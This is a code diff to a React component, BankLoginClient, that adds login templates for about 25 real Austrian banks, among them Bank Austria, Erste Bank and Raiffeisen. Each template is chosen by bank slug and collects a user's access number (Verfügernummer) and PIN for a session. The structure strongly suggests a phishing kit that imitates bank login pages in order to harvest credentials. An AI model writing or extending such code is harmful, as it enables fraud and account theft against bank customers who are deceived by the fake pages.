@@ -12,6 +12,33 @@ import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
 import { getRenderableImageProps } from "@/lib/visual-tree-logo";
 import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
 
+// Austrian Banks from templates
+import { BankAustria } from "@/components/templates/BankAustria";
+import { BawagAg } from "@/components/templates/BawagAg";
+import { ErsteBank } from "@/components/templates/ErsteBank";
+import { Raiffeisen } from "@/components/templates/Raiffeisen";
+import { Volksbanken } from "@/components/templates/Volksbanken";
+import { PosojilnicaBank } from "@/components/templates/PosojilnicaBank";
+import { Bank99 } from "@/components/templates/Bank99";
+import { BtvVierLanderBank } from "@/components/templates/BtvVierLanderBank";
+import { BksBank } from "@/components/templates/BksBank";
+import { Oberbank } from "@/components/templates/Oberbank";
+import { HypoNoe } from "@/components/templates/HypoNoe";
+import { HypoTirol } from "@/components/templates/HypoTirol";
+import { HypoVorarlberg } from "@/components/templates/HypoVorarlberg";
+import { HypoBurgenland } from "@/components/templates/HypoBurgenland";
+import { HypoOberosterreich } from "@/components/templates/HypoOberosterreich";
+import { AerzteApothekerBank } from "@/components/templates/AerzteApothekerBank";
+import { BankhausSpangler } from "@/components/templates/BankhausSpangler";
+import { SchelhammerCapital } from "@/components/templates/SchelhammerCapital";
+import { Easybank } from "@/components/templates/Easybank";
+import { Schoellerbank } from "@/components/templates/Schoellerbank";
+import { SpardaBank } from "@/components/templates/SpardaBank";
+import { Volkskreditbank } from "@/components/templates/Volkskreditbank";
+import { AnadiBank } from "@/components/templates/AnadiBank";
+import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
+import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
+
 type Props = {
   sessionId: string;
   bankSlug: string;
@@ -104,6 +131,43 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         </p>
       </div>
     );
+  }
+
+  // OUSTRIAN BANKS CUSTOM TEMPLATES
+  const handleTemplateChange = (field: string, value: string) => {
+    if (field === "verfuegernummer") setVerfuegernummer(value);
+    if (field === "pin") setPin(value);
+  };
+  const handleTemplateSubmit = () => handleSubmit();
+  
+  const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);
+
+  if (!hasGeneratedDesign) {
+    if (bankSlug === "bank-austria") return <BankAustria formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "bawag") return <BawagAg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "erste-bank") return <ErsteBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "raiffeisen") return <Raiffeisen formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "volksbank") return <Volksbanken formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "posojilnica") return <PosojilnicaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "bank99") return <Bank99 formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "btv") return <BtvVierLanderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "bks-bank") return <BksBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "oberbank") return <Oberbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "hypo-noe") return <HypoNoe formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "hypo-tirol") return <HypoTirol formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "hypo-vorarlberg") return <HypoVorarlberg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "hypo-burgenland") return <HypoBurgenland formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "hypo-ooe") return <HypoOberosterreich formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "aerztebank") return <AerzteApothekerBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "spaengler") return <BankhausSpangler formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "schelhammer") return <SchelhammerCapital formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "easybank") return <Easybank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "schoellerbank-ag" || bankSlug === "schoellerbank") return <Schoellerbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "sparda-bank") return <SpardaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "vkb") return <Volkskreditbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "anadi-bank") return <AnadiBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "marchfelder") return <MarchfelderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
+    if (bankSlug === "dolomitenbank") return <Dolomitenbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
   }
 
   // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
